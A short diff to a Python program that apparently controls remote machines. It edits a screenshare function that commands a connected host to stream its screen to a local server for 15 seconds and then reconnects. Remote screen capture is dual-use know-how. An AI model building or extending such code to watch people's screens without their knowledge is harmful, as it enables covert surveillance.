@@ -107,15 +107,15 @@ def username(conn, command):
 
 
 def screenshare(conn, command, sock):
-    print("Not working yet")
     conn.send(command.encode())
     sock.close()
     conn.close()
     receiver = StreamingServer("192.168.178.59", 8080)
     t = threading.Thread(target=receiver.start_server)
     t.start()
-    time.sleep(60)
+    time.sleep(15)
     receiver.stop_server()
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     connect()
 
 
